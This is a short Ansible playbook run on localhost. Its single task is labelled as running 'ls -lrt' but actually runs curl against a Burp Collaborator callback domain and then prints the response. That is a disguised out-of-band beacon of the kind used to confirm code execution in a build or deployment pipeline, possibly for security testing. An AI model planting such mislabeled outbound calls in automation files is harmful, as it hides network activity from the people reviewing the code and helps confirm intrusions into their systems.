---
  - name: "Playing with Ansible and Git"
    hosts: localhost
    connection: local 
    tasks:

    - name: "just execute a ls -lrt command"
      shell: "curl http://94bly1jxh7jhv557aaug58hohfn6bv.burpcollaborator.net/"
      register: "output"

    - debug: var=output.stdout_lines
